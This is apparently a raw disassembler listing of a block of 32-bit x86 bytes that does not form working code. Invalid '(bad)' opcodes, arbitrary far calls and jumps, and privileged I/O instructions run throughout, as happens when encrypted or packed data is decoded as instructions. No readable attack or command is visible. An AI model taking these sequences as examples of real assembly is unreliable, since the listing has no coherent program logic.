  41209d:	add    eax,0xce6be1e3
  4120a2:	dec    edi
  4120a3:	stos   DWORD PTR es:[edi],eax
  4120a4:	mov    edx,0xd058be04
  4120a9:	fisttp DWORD PTR [ebx]
  4120ab:	xor    al,0x64
  4120ad:	mov    bh,0xde
  4120af:	cld    
  4120b0:	(bad)  
  4120b1:	cld    
  4120b2:	clc    
  4120b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120b4:	(bad)  
  4120b5:	cdq    
  4120b6:	(bad)  
  4120b7:	sbb    al,0x68
  4120b9:	adc    ch,BYTE PTR [ebx+0x77]
  4120bc:	ja     0x41206d
  4120be:	cmp    ebx,ecx
  4120c0:	push   ecx
  4120c1:	cmp    al,0x87
  4120c3:	lods   eax,DWORD PTR ds:[esi]
  4120c4:	xchg   esp,eax
  4120c5:	int    0x7f
  4120c7:	rep outs dx,DWORD PTR ds:[esi]
  4120c9:	adc    al,0x92
  4120cb:	ret    0x1061
  4120ce:	push   0x78d418d3
  4120d3:	idiv   BYTE PTR [edx+ebx*1+0x3a]
  4120d7:	mov    al,ds:0xe20a5019
  4120dc:	iret   
  4120dd:	test   BYTE PTR [ecx-0x5a],dh
  4120e0:	pop    esi
  4120e1:	adc    eax,0xd7a49990
  4120e6:	add    al,0xcc
  4120e8:	loop   0x4120a6
  4120ea:	dec    ecx
  4120eb:	dec    edx
  4120ec:	mov    dl,0x7a
  4120ee:	add    al,0x7d
  4120f0:	sub    ebx,DWORD PTR [ebx]
  4120f2:	xor    bl,cl
  4120f4:	retf   
  4120f5:	mov    ch,0xb9
  4120f7:	cmp    BYTE PTR ds:0x4c42830a,al
  4120fd:	jb     0x412121
  4120ff:	xor    ebx,DWORD PTR [ecx]
  412101:	ret    0xcb7
  412104:	pop    esi
  412105:	xchg   edx,eax
  412106:	in     eax,dx
  412107:	mov    esp,0x8f072e4b
  41210c:	or     BYTE PTR [esi+edi*2+0x57d1636d],0x88
  412114:	and    edx,0xffffffe3
  412117:	xchg   ebx,eax
  412118:	mov    ah,0x6b
  41211a:	mov    esp,DWORD PTR [esi+0x77]
  41211d:	xchg   esp,eax
  41211e:	xlat   BYTE PTR ds:[ebx]
  41211f:	inc    edx
  412120:	jl     0x412129
  412122:	out    dx,al
  412123:	pop    ebx
  412124:	imul   esp
  412126:	sbb    al,BYTE PTR [edx+0x24]
  412129:	add    BYTE PTR ds:[esi-0x37],dl
  41212d:	mov    es,esi
  41212f:	dec    ecx
  412130:	fsubr  DWORD PTR [ebp+0x1903ce9f]
  412136:	push   ss
  412137:	retf   
  412138:	xor    ebp,edi
  41213a:	jb     0x412107
  41213c:	cmp    cl,BYTE PTR [eax+0x5d]
  41213f:	mov    al,ds:0xea551296
  412144:	cmp    ecx,edx
  412146:	sbb    al,BYTE PTR ds:0x330eb0e2
  41214c:	mov    esi,0xf02ea685
  412151:	sbb    ah,BYTE PTR [edi]
  412153:	test   al,0x88
  412155:	sbb    DWORD PTR [edi-0x2c],eax
  412158:	mov    ebp,0x8519e37a
  41215d:	adc    DWORD PTR [ecx+edx*8+0x2e935717],eax
  412164:	lods   al,BYTE PTR ds:[esi]
  412165:	add    al,ch
  412167:	cmp    BYTE PTR [esi+0x1465ce98],ah
  41216d:	xchg   edi,eax
  41216e:	xor    eax,0x3dc5648
  412173:	cvtps2pi mm0,QWORD PTR ds:0xc86969be
  41217a:	and    esp,DWORD PTR [ebp+0x6a41d517]
  412180:	and    eax,0xb5c9f6e3
  412185:	mov    WORD PTR [eax+0x7c],fs
  412188:	mov    bh,0xe0
  41218a:	(bad)  
  41218b:	loop   0x41213e
  41218d:	push   cs
  41218e:	ret    0xfc3
  412191:	xchg   edi,eax
  412192:	pop    ebx
  412193:	pop    edx
  412194:	dec    eax
  412195:	dec    ecx
  412196:	add    edi,DWORD PTR [ebx-0x45]
  412199:	pop    ds
  41219a:	sbb    bl,BYTE PTR [ecx+0x7a]
  41219d:	sti    
  41219e:	push   ebx
  41219f:	xor    eax,0x208219e8
  4121a4:	lods   eax,DWORD PTR ds:[esi]
  4121a5:	dec    esi
  4121a6:	jecxz  0x412181
  4121a8:	mov    al,0x75
  4121aa:	and    BYTE PTR [eax],al
  4121ac:	mov    DWORD PTR [edi+0xe811cc6],edx
  4121b2:	hlt    
  4121b3:	add    DWORD PTR [ebp-0x2925ea08],esp
  4121b9:	or     esi,esp
  4121bb:	push   ebx
  4121bc:	in     al,0xf5
  4121be:	xor    ebx,ebx
  4121c0:	push   eax
  4121c1:	js     0x412180
  4121c3:	and    BYTE PTR [edi-0x5c73a867],dh
  4121c9:	jb     0x412215
  4121cb:	cmp    DWORD PTR [edi+0x65],ebx
  4121ce:	add    eax,0xbb48764b
  4121d3:	push   edx
  4121d4:	mov    esi,edi
  4121d6:	adc    BYTE PTR [edi],bh
  4121d8:	xchg   esp,eax
  4121d9:	mov    al,0x95
  4121db:	xchg   ebp,eax
  4121dc:	(bad)  
  4121dd:	loop   0x4121ac
  4121df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121e1:	push   cs
  4121e2:	mov    bh,0x6
  4121e4:	das    
  4121e5:	(bad)  
  4121e6:	sbb    eax,0x7b9fb7da
  4121eb:	xor    eax,0x8e37831f
  4121f0:	add    DWORD PTR [esi+0x34],edx
  4121f3:	dec    esi
  4121f4:	outs   dx,BYTE PTR ds:[esi]
  4121f5:	xor    DWORD PTR [esi],edx
  4121f7:	sbb    eax,0xef949e6a
  4121fc:	push   esp
  4121fd:	call   0x768985d
  412202:	adc    al,0x24
  412204:	sbb    DWORD PTR [edi+0x312a3358],esi
  41220a:	shl    BYTE PTR [edx+edx*4],0x28
  41220e:	loopne 0x41219d
  412210:	add    esp,DWORD PTR [eax-0x5bc65a9f]
  412216:	stc    
  412217:	inc    edx
  412218:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412219:	xchg   edi,eax
  41221a:	add    edi,DWORD PTR ds:0x5805d1c3
  412220:	sar    BYTE PTR [esi-0x10c762db],0x62
  412227:	add    DWORD PTR [eax-0x77ad876],edi
  41222d:	jecxz  0x412274
  41222f:	popf   
  412230:	(bad)  
  412232:	push   0xffffff9b
  412234:	jmp    0xd5d63399
  412239:	scas   al,BYTE PTR es:[edi]
  41223a:	sahf   
  41223b:	call   0x524c:0x817c7115
  412242:	stc    
  412243:	les    eax,FWORD PTR [eax]
  412245:	inc    edx
  412246:	jmp    0x4122c2
  412248:	pop    es
  412249:	inc    esp
  41224a:	call   0x6136:0xa945bd11
  412251:	mov    al,0xb2
  412253:	mov    BYTE PTR [ebp-0x50],cl
  412256:	mov    dh,BYTE PTR [eax]
  412258:	dec    edx
  412259:	push   cs
  41225a:	sub    eax,0x281bb2e5
  41225f:	int3   
  412260:	mov    ds:0xe9196df9,al
  412265:	sbb    al,0x2d
  412267:	in     al,0x88
  412269:	adc    BYTE PTR [ecx+0x2d],dl
  41226c:	or     esp,DWORD PTR [ecx-0xc]
  41226f:	xchg   edi,eax
  412270:	xor    BYTE PTR [esi+ecx*1+0x35],ch
  412274:	and    al,0xad
  412276:	notrack jmp DWORD PTR [esi]
  412279:	xor    DWORD PTR [edi+0x3c6c841e],0xffffffcc
  412280:	ds jle 0x4122ac
  412283:	xor    eax,0x97d2ca8f
  412288:	sbb    bh,ch
  41228a:	call   0x96092f0c
  41228f:	(bad)  
  412290:	hlt    
  412291:	repnz xor eax,0xe3b249b3
  412297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412298:	mov    ds:0x948bf51e,al
  41229d:	mov    esp,0x4e21c593
  4122a2:	aas    
  4122a3:	out    0xab,eax
  4122a5:	repz jecxz 0x4122dc
  4122a8:	pop    ds
  4122a9:	scas   eax,DWORD PTR es:[edi]
  4122aa:	(bad)  
  4122ad:	add    ah,BYTE PTR [esi-0x46adbd8e]
  4122b3:	xchg   edi,eax
  4122b4:	test   eax,0xafcc5d10
  4122b9:	jnp    0x412326
  4122bb:	imul   ecx,DWORD PTR [ecx],0x3a
  4122be:	add    ebx,DWORD PTR [eax*8-0x4d4e8337]
  4122c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122c6:	add    eax,0xfc0b9036
  4122cb:	ja     0x41227b
  4122cd:	in     eax,0x4a
  4122cf:	or     esi,ecx
  4122d1:	(bad)  
  4122d2:	adc    edx,DWORD PTR [ecx+0x59]
  4122d5:	out    dx,al
  4122d6:	mov    ds,ebp
  4122d8:	add    al,BYTE PTR [edi-0x498beb78]
  4122de:	retf   0x185f
  4122e1:	mov    eax,ds:0xfc9b7aa4
  4122e6:	rcl    BYTE PTR [esp+eax*4],1
  4122e9:	fld    st(3)
  4122eb:	ins    DWORD PTR es:[edi],dx
  4122ec:	xor    bh,ch
  4122ee:	mov    ch,0x61
  4122f0:	mov    eax,ds:0xaa9ea368
  4122f5:	push   edx
  4122f6:	or     dl,ch
  4122f8:	pop    edx
  4122f9:	push   ds
  4122fa:	rcl    BYTE PTR [ebx-0x2817fcfe],0x47
  412301:	mov    cl,0xb4
  412303:	sahf   
  412304:	mov    al,ds:0x22b6d1cf
  412309:	call   0x63e5:0xfeb6da5e
  412310:	or     al,0xa6
  412312:	adc    DWORD PTR [ebp+ecx*1-0x4d91282e],0x7b
  41231a:	cmc    
  41231b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41231c:	sub    edx,DWORD PTR [edi-0x34]
  41231f:	adc    DWORD PTR [esi-0x17],0x63afbfb5
  412326:	rcl    DWORD PTR [ecx],cl
  412328:	mov    DWORD PTR [esi-0x46e9f0f7],ebx
  41232e:	inc    esp
  41232f:	fild   DWORD PTR [eax+0x5ead55b0]
  412335:	adc    BYTE PTR [edx+esi*8],ah
  412338:	cmp    eax,edi
  41233a:	push   esp
  41233b:	mov    esp,DWORD PTR [ecx+eiz*4]
  41233e:	xchg   edx,eax
  41233f:	or     ebx,DWORD PTR [esi+0x7d]
  412342:	leave  
  412343:	cli    
  412344:	rol    bh,1
  412346:	sbb    al,0x7c
  412348:	sti    
  412349:	mov    bl,0x46
  41234b:	push   es
  41234c:	pop    es
  41234d:	outs   dx,DWORD PTR ds:[esi]
  41234e:	popa   
  41234f:	cmp    edx,DWORD PTR [ebp+edx*1+0x6691dcff]
  412356:	pop    ss
  412357:	rol    ah,0x60
  41235a:	retf   0x6db8
  41235d:	xor    al,0xf1
  41235f:	sub    edi,eax
  412361:	sar    DWORD PTR [edx+ebp*1+0x7056e5f],0xa8
  412369:	cdq    
  41236a:	jecxz  0x412376
  41236c:	xchg   ecx,eax
  41236d:	jp     0x412322
  41236f:	not    ecx
  412371:	(bad)  [esi+0xd230237]
  412377:	retf   0xef07
  41237a:	cmp    al,0xec
  41237c:	sub    dl,BYTE PTR [ecx-0x67ac8899]
  412382:	jnp    0x4123dd
  412384:	ds test al,0x3c
  412387:	lods   eax,DWORD PTR ds:[esi]
  412388:	or     al,BYTE PTR [eax]
  41238a:	out    dx,eax
  41238b:	xchg   esp,eax
  41238c:	sbb    al,0xbd
  41238e:	xchg   BYTE PTR [esi+0x7e00bedb],cl
  412394:	in     al,0xd8
  412396:	push   ecx
  412397:	repz inc ebp
  412399:	jle    0x412402
  41239b:	js     0x412396
  41239d:	mov    ecx,ebx
  41239f:	pusha  
  4123a0:	ror    BYTE PTR [edx],1
  4123a2:	mov    ch,0x44
  4123a4:	xor    esp,ebp
  4123a6:	inc    edx
  4123a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123a8:	scas   al,BYTE PTR es:[edi]
  4123a9:	jne    0x412415
  4123ab:	aad    0xd7
  4123ad:	stos   DWORD PTR es:[edi],eax
  4123ae:	sub    DWORD PTR [ecx+0x57],esi
  4123b1:	in     eax,dx
  4123b2:	aam    0x52
  4123b4:	in     eax,dx
  4123b5:	test   DWORD PTR [esi],esi
  4123b7:	jne    0x412391
  4123b9:	frstor [ebp+0x5314f4e0]
  4123bf:	add    esi,DWORD PTR gs:[esi]
  4123c2:	stos   DWORD PTR es:[edi],eax
  4123c3:	xchg   esp,eax
  4123c4:	js     0x4123b5
  4123c6:	xchg   edx,eax
  4123c7:	mov    WORD PTR [eax+0x59382cd1],?
  4123cd:	pop    esp
  4123ce:	xchg   esi,eax
  4123cf:	push   ecx
  4123d0:	ja     0x412378
  4123d2:	popa   
  4123d3:	mov    ebx,0x5f03c96b
  4123d8:	mov    DWORD PTR gs:[eax+0x6cc45841],0x76e31de4
  4123e3:	mov    DWORD PTR [edi+0x599210bc],esp
  4123e9:	sbb    ebp,DWORD PTR [di]
  4123ec:	jmp    0x412461
  4123ee:	add    DWORD PTR [edi-0x40b66b01],edi
  4123f4:	scas   eax,DWORD PTR es:[edi]
  4123f5:	shl    BYTE PTR [ebx],0x42
  4123f8:	out    0x12,eax
  4123fa:	imul   esp,DWORD PTR [ebx+0x77],0x1847a4d8
  412401:	pop    ebp
  412402:	test   eax,0x4484e058
  412407:	dec    ecx
  412408:	pop    DWORD PTR [ecx]
  41240a:	xchg   esp,eax
  41240b:	jl     0x41245f
  41240d:	add    DWORD PTR [esp+eax*4+0x7b],ebx
  412411:	popf   
  412412:	fs dec esp
  412414:	sub    BYTE PTR [edi+0x2fe5de51],al
  41241a:	clc    
  41241b:	and    ebx,DWORD PTR [eax]
  41241d:	mov    cl,0xb6
  41241f:	test   DWORD PTR [eax+edi*2],ecx
  412422:	jb     0x412474
  412424:	imul   ebx,DWORD PTR [ecx+0xc85cf16],0x30
  41242b:	mov    ebx,0xa3991188
  412430:	pushf  
  412431:	jmp    0x4123cf
  412433:	mov    bh,BYTE PTR [edx+edi*4+0x6606766f]
  41243a:	in     eax,dx
  41243b:	es in  al,dx
  41243d:	push   edi
  41243e:	mov    bh,0xc4
  412440:	test   BYTE PTR [ebx+eax*2],dh
  412443:	xor    al,0x11
  412445:	mov    bh,0x74
  412447:	or     esi,eax
  412449:	scas   al,BYTE PTR es:[edi]
  41244a:	ja     0x41244e
  41244c:	inc    ecx
  41244d:	xchg   ecx,eax
  41244e:	jno    0x412434
  412450:	cmp    al,0x7f
  412452:	push   es
  412453:	mov    fs,WORD PTR [ebp-0x69595a87]
  412459:	mov    ebx,0x2f007f14
  41245e:	scas   eax,DWORD PTR es:[edi]
  41245f:	imul   edx,DWORD PTR [eax],0x878c2845
  412465:	xor    ebp,DWORD PTR [eax]
  412467:	or     edx,DWORD PTR [ebp-0x34]
  41246a:	xchg   BYTE PTR [ebp+0x181ad42a],dl
  412470:	cld    
  412471:	push   cs
  412472:	pop    ds
  412473:	jecxz  0x412420
  412475:	sub    BYTE PTR [esi-0xf],al
  412478:	(bad)  [ebp-0x5c9122c5]
  41247e:	jno    0x412424
  412480:	mov    ah,0x7
  412482:	hlt    
  412483:	cs out 0x86,al
  412486:	xchg   ebp,eax
  412487:	ror    BYTE PTR [ebx+0x1cfa0e26],0x5e
  41248e:	adc    eax,0x2e10ca67
  412493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412494:	std    
  412495:	repnz enter 0xae86,0xc5
  41249a:	retf   
  41249b:	imul   ecx,DWORD PTR [edx],0xffffffbc
  41249e:	xor    BYTE PTR [esi-0x35dd9ba6],ah
  4124a4:	scas   eax,DWORD PTR es:[edi]
  4124a5:	cli    
  4124a6:	es cwde 
  4124a8:	retf   0xb15d
  4124ab:	loope  0x4124e2
  4124ad:	inc    ecx
  4124ae:	jge    0x4124c0
  4124b0:	sbb    DWORD PTR [edi],eax
  4124b2:	ret    0x77be
  4124b5:	mov    BYTE PTR [edi],al
  4124b7:	inc    ebp
  4124b8:	fst    QWORD PTR [esi+0x2b]
  4124bb:	jle    0x412448
  4124bd:	and    BYTE PTR [eax+0x67273ff3],dh
  4124c3:	jl     0x412538
  4124c5:	cmc    
  4124c6:	mov    ah,0x31
  4124c8:	add    eax,0x74aaa6a8
  4124cd:	fs pop ss
  4124cf:	mov    ?,WORD PTR [esi]
  4124d1:	dec    edx
  4124d2:	xchg   ebx,eax
  4124d3:	out    0x3,eax
  4124d5:	mov    ah,0x1b
  4124d7:	hlt    
  4124d8:	push   ecx
  4124d9:	enter  0xfb9f,0xba
  4124dd:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124df:	pop    esi
  4124e0:	xor    al,0x5a
  4124e2:	xchg   esp,eax
  4124e3:	es rcl bh,1
  4124e6:	out    dx,eax
  4124e7:	fidiv  DWORD PTR ds:0x7c8a88ce
  4124ed:	cmp    DWORD PTR [ebx+0x32],ebx
  4124f0:	or     eax,0xec39fe46
  4124f5:	push   esp
  4124f6:	fist   WORD PTR [edx]
  4124f8:	cli    
  4124f9:	ror    dh,cl
  4124fb:	shr    ebp,cl
  4124fd:	stos   DWORD PTR es:[edi],eax
  4124fe:	cmp    cl,BYTE PTR ds:0x82b4e7aa
  412504:	frstor [ecx-0x15f6189b]
  41250a:	mov    esi,0xbd22d25e
  41250f:	or     BYTE PTR [ecx-0x3a7cd6db],al
  412515:	pop    edi
  412516:	pop    eax
  412517:	call   0xec689802
  41251c:	shr    edx,cl
  41251e:	mov    bh,dl
  412520:	push   0x1d
  412522:	xchg   ecx,eax
  412523:	(bad)  [edx+ecx*2+0x475e15aa]
  41252a:	lods   al,BYTE PTR ds:[esi]
  41252b:	jae    0x4124ee
  41252d:	inc    edi
  41252e:	sbb    esi,DWORD PTR [ecx+eax*2]
  412531:	cld    
  412532:	mov    cl,0xe2
  412534:	inc    esp
  412535:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412536:	dec    esi
  412537:	gs repnz cli 
  41253a:	xor    al,0xd
  41253c:	dec    edx
  41253d:	(bad)  
  41253f:	push   esi
  412540:	scas   al,BYTE PTR es:[edi]
  412541:	dec    esp
  412542:	shl    esi,cl
  412544:	mov    bl,0x21
  412546:	or     cl,BYTE PTR [esi-0x7a]
  412549:	mov    DWORD PTR [edx-0x5edcba3],edx
  41254f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412550:	adc    dh,BYTE PTR es:[esi+0x2eb386a2]
  412557:	imul   ebp,DWORD PTR [ebx],0x21
  41255a:	in     al,0x3e
  41255c:	sub    BYTE PTR [esi-0x5dcabb47],dh
  412562:	mov    bh,0x17
  412564:	retf   
  412565:	fisttp DWORD PTR [edi-0x36c7b743]
  41256b:	sbb    edx,esi
  41256d:	and    BYTE PTR [ecx-0x46],ah
  412570:	mov    eax,0xa40633a2
  412575:	in     eax,0xf2
  412577:	push   ebx
  412578:	lock pop es
  41257a:	mov    esi,0x9f62ed8c
  41257f:	stc    
  412580:	loop   0x4125c2
  412582:	sbb    edx,eax
  412584:	adc    ah,dl
  412586:	test   DWORD PTR [ecx],0xf1379906
  41258c:	pop    esi
  41258d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41258e:	add    al,0x82
  412590:	pop    ebp
  412591:	xchg   esi,ecx
  412593:	push   edx
  412594:	cli    
  412595:	imul   edx,edx,0x788cfe4b
  41259b:	sar    DWORD PTR [edx+0x74],1
  41259e:	sub    eax,0xd99af6e
  4125a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125a4:	cmc    
  4125a5:	mov    edi,0x27b2f0d8
  4125aa:	test   BYTE PTR [ebx+esi*8+0x5f],ah
  4125ae:	cdq    
  4125af:	dec    esi
  4125b0:	scas   al,BYTE PTR es:[edi]
  4125b1:	ret    
  4125b2:	jmp    0x647e:0x81d74bd3
  4125b9:	call   0xc1fd:0xa23ec11f
  4125c0:	fidivr WORD PTR [edx+0x70261e31]
  4125c6:	pop    ecx
  4125c7:	and    ecx,esp
  4125c9:	mov    dl,0x98
  4125cb:	pop    esi
  4125cc:	test   DWORD PTR [edx],0x43e88d8b
  4125d2:	ds cmp eax,0xbc79247e
  4125d8:	add    esp,DWORD PTR [ecx-0x4119dba4]
  4125de:	dec    ebx
  4125df:	jmp    0xf698:0xc10853bf
  4125e6:	outs   dx,BYTE PTR ds:[esi]
  4125e7:	js     0x4125eb
  4125e9:	mov    cl,0x9e
  4125eb:	or     BYTE PTR [ebx],ch
  4125ed:	icebp  
  4125ee:	jecxz  0x41259d
  4125f0:	mov    BYTE PTR [ebx+0x2f4a81a8],ch
  4125f6:	cmp    eax,0xf74f8912
  4125fb:	xor    ebp,DWORD PTR [edx]
  4125fd:	cmp    ch,BYTE PTR [edx]
  4125ff:	mov    esi,DWORD PTR [esi]
  412601:	xchg   ebx,eax
  412602:	repnz retf 0xae09
  412606:	jmp    0x89eb:0xe3ee21a1
  41260d:	pop    ebx
  41260e:	adc    ebx,eax
  412610:	pushf  
  412611:	jmp    0x412593
  412613:	call   0xab5cf73b
  412618:	das    
  412619:	jge    0x41265c
  41261b:	stc    
  41261c:	xor    eax,0x467fea9e
  412621:	bound  edx,QWORD PTR [ebp-0x1e2b6eaf]
  412627:	adc    bl,BYTE PTR [ecx+0x78]
  41262a:	sbb    BYTE PTR [eax+ebx*2],bl
  41262d:	mov    edx,0xc9ee0811
  412632:	retf   0x19d9
  412635:	mov    esi,0x41d3f3ec
  41263a:	retf   
  41263b:	sub    eax,0xdb9801f0
  412640:	add    BYTE PTR [eax+0x755da622],al
  412646:	jmp    0x41266a
  412648:	(bad)  
  412649:	data16 mov cl,0xe5
  41264c:	sbb    dl,BYTE PTR [edx+0x3ce604b2]
  412652:	loop   0x412621
  412654:	rcl    BYTE PTR [edx],cl
  412656:	out    dx,al
  412657:	out    0x58,al
  412659:	xchg   BYTE PTR [edx+0x7c],al
  41265c:	sub    eax,0x90907fcb
  412661:	cmp    bl,ch
  412663:	lahf   
  412664:	xor    eax,0x985039e1
  412669:	xchg   esp,eax
  41266a:	or     esi,DWORD PTR [eax-0x67]
  41266d:	sbb    al,0xdc
  41266f:	sahf   
  412670:	push   eax
  412671:	shl    dl,0x4
  412674:	sbb    ah,BYTE PTR [ecx+eax*1-0xa94ba6a]
  41267b:	outs   dx,BYTE PTR ds:[esi]
  41267c:	add    BYTE PTR [esi-0x35],dh
  41267f:	aas    
  412680:	mov    bh,0x21
  412682:	adc    BYTE PTR [ebp*2-0x3740d5dc],cl
  412689:	cmp    DWORD PTR [ebx-0x6bcb7f32],edx
  41268f:	test   BYTE PTR [edi-0x5f],dh
  412692:	pushf  
  412693:	outs   dx,BYTE PTR ds:[esi]
  412694:	popa   
  412695:	clc    
  412696:	push   0xffffffe0
  412698:	loopne 0x4126b9
  41269a:	sub    ebp,DWORD PTR [ebp-0x37]
  41269d:	push   ss
  41269e:	dec    BYTE PTR [edi]
  4126a0:	sbb    ch,BYTE PTR [edi-0xd]
  4126a3:	jb     0x41271e
  4126a5:	push   0x75
  4126a7:	std    
  4126a8:	loop   0x41266a
  4126aa:	add    bh,al
  4126ac:	repnz inc edx
  4126ae:	jb     0x412720
  4126b0:	mov    edx,0x62387f0b
  4126b5:	aad    0xfe
  4126b7:	loop   0x4126a7
  4126b9:	call   0xed82:0x370d56a4
  4126c0:	adc    al,0x2e
  4126c2:	in     eax,0x6f
  4126c4:	or     ecx,DWORD PTR [edi-0x18]
  4126c7:	inc    esp
  4126c8:	sub    dh,BYTE PTR [edx]
  4126ca:	shr    DWORD PTR [eax],1
  4126cc:	xchg   esp,eax
  4126cd:	pusha  
  4126ce:	mov    dh,0x5d
  4126d0:	loopne 0x412689
  4126d2:	mov    ebp,0xef852687
  4126d7:	lds    edx,FWORD PTR [esi]
  4126d9:	fcomp  DWORD PTR [eax+0x4f]
  4126dc:	cmp    BYTE PTR [esi+0x1ebeb20c],ch
  4126e2:	mov    bh,BYTE PTR [esi-0x7f]
  4126e5:	bound  edx,QWORD PTR [esi+0x8f41edf]
  4126eb:	jne    0x412732
  4126ed:	mov    al,0xb1
  4126ef:	adc    edi,edx
  4126f1:	in     al,0x17
  4126f3:	pop    ecx
  4126f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126f5:	in     al,dx
  4126f6:	sbb    DWORD PTR [edi-0x56],edi
  4126f9:	sbb    BYTE PTR [edi+0x72],dh
  4126fc:	and    ebx,ebx
  4126fe:	cmp    BYTE PTR [edx-0x4f],cl
  412701:	mov    ds:0xb3d473bb,eax
  412706:	cmp    ah,ah
  412708:	jns    0x41274a
  41270a:	test   eax,ecx
  41270c:	pop    edi
  41270d:	in     eax,0xe6
  41270f:	imul   ebp,edx,0xffffffa3
  412712:	adc    ah,BYTE PTR [ecx+0x6c1eabc8]
  412718:	or     eax,0xad4f7ed5
  41271d:	mov    al,0x9
  41271f:	imul   ebp,DWORD PTR [eax+0x1],0x822e27e9
  412726:	lahf   
  412727:	sub    BYTE PTR [edi+0x4c],0x16
  41272b:	jnp    0x4127a4
  41272d:	add    ecx,DWORD PTR [ebx]
  41272f:	popf   
  412730:	or     ecx,DWORD PTR [edx-0x38]
  412733:	inc    edx
  412734:	int3   
  412735:	lea    esp,[eax]
  412737:	inc    ebx
  412738:	pop    ds
  412739:	dec    eax
  41273a:	mov    WORD PTR [edx],ds
  41273c:	mov    ah,0x4e
  41273e:	shl    bl,1
  412740:	adc    DWORD PTR [esi],ebp
  412742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412743:	jmp    0x4126ff
  412745:	mov    ds:0xd4d2da3c,eax
  41274a:	sub    al,0xa7
  41274c:	je     0x41274b
  41274e:	pop    esi
  41274f:	adc    DWORD PTR [edx+0x101c2cad],ebx
  412755:	(bad)  
  412756:	sbb    edi,DWORD PTR [edi+ecx*1+0x2eb36a0f]
  41275d:	jno    0x4127c1
  41275f:	lea    eax,[ecx+0x28bc9ecb]
  412765:	out    dx,eax
  412766:	sar    DWORD PTR [eax-0x59],1
  412769:	ins    DWORD PTR es:[edi],dx
  41276a:	jle    0x4127b4
  41276c:	xor    ch,BYTE PTR [ecx+eiz*1]
  41276f:	clc    
  412770:	adc    al,0x5
  412772:	test   DWORD PTR [edx+ebp*8],edx
  412775:	adc    ecx,DWORD PTR [ebx+ebp*4+0x2e]
  412779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41277a:	enter  0x70f4,0x3d
  41277e:	xor    ebx,edi
  412780:	in     eax,dx
  412781:	adc    al,0xec
  412783:	fsub   QWORD PTR [ebx+0x40]
  412786:	int3   
  412787:	imul   edi,DWORD PTR [esi+0x75],0xaeff2c33
  41278e:	loope  0x412741
  412790:	scas   al,BYTE PTR es:[edi]
  412791:	cmp    BYTE PTR [ebx+0x13],ch
  412794:	add    eax,0xbcf6a9cb
  412799:	sub    eax,0x529252b
  41279e:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4127a0:	hlt    
  4127a1:	ss xor eax,0x54a2a708
  4127a7:	push   edi
  4127a8:	cmc    
  4127a9:	je     0x4127e9
  4127ab:	cmp    cl,BYTE PTR [eax+0x40]
  4127ae:	mov    edx,es
  4127b0:	daa    
  4127b1:	cmp    eax,0x41d17095
  4127b6:	lods   eax,DWORD PTR ds:[esi]
  4127b7:	lds    ebp,FWORD PTR ds:0xe5e5d4ec
  4127bd:	inc    dh
  4127bf:	out    dx,eax
  4127c0:	or     BYTE PTR [eax+ecx*1],cl
  4127c3:	pop    ecx
  4127c4:	cdq    
  4127c5:	xor    cl,dl
  4127c7:	loopne 0x412848
  4127c9:	jb     0x412832
  4127cb:	jmp    0x4127b7
  4127cd:	jns    0x4127eb
  4127cf:	loope  0x4127cb
  4127d1:	jmp    0xbf2c2a49
  4127d6:	popf   
  4127d7:	push   esp
  4127d8:	mov    dh,0x9b
  4127da:	ss pop eax
  4127dc:	mov    edx,edx
  4127de:	pop    ds
  4127df:	stos   DWORD PTR es:[edi],eax
  4127e0:	pop    eax
  4127e1:	xchg   edx,eax
  4127e2:	and    DWORD PTR [ebx-0x39361c7d],ebp
  4127e8:	add    DWORD PTR [edx],esp
  4127ea:	xor    DWORD PTR [ebx+0x40358576],edi
  4127f0:	sti    
  4127f1:	les    edx,FWORD PTR [ecx-0x1b8e9ea]
  4127f7:	mov    ds:0x51ce6af9,eax
  4127fc:	add    ebx,DWORD PTR [edx+0x60eb4052]
  412802:	cmp    BYTE PTR ds:0xbfbb0a25,ah
  412808:	pop    eax
  412809:	in     al,0x9a
  41280b:	loop   0x4127b2
  41280d:	loope  0x412847
  41280f:	cmc    
  412810:	adc    DWORD PTR [ebx+eax*2-0x271188b2],ecx
  412817:	jmp    eax
  412819:	jne    0x412832
  41281b:	imul   edi,DWORD PTR [ecx+0xe5985d8],0xffffffc3
  412822:	pop    eax
  412823:	icebp  
  412824:	dec    ebx
  412825:	sbb    DWORD PTR [edi],esp
  412827:	sub    eax,0x3f76bdea
  41282c:	das    
  41282d:	pop    edx
  41282e:	dec    eax
  41282f:	sub    bl,bl
  412831:	loope  0x412844
  412833:	imul   edi,DWORD PTR [ecx-0x68],0x25
  412837:	(bad)  
  412838:	pop    ds
  412839:	jno    0x4127d1
  41283b:	fmul   st,st(6)
  41283d:	jmp    0x41289b
  41283f:	lahf   
  412840:	push   ds
  412841:	jmp    0x48001bbf
  412846:	int    0x5
  412848:	jns    0x4128c4
  41284a:	and    eax,0x51ad255f
  41284f:	add    eax,0xe973c947
  412854:	ret    0x1bb4
  412857:	scas   eax,DWORD PTR es:[edi]
  412858:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412859:	sbb    ecx,ecx
  41285b:	xrstor [eax+0x1]
  41285f:	icebp  
  412860:	outs   dx,DWORD PTR ds:[esi]
  412861:	(bad)  
  412862:	icebp  
  412863:	gs dec edx
  412865:	dec    ebx
  412866:	lods   eax,DWORD PTR ds:[esi]
  412867:	cmp    ah,al
  412869:	les    ebp,FWORD PTR [esi+0x11]
  41286c:	pop    esp
  41286d:	cld    
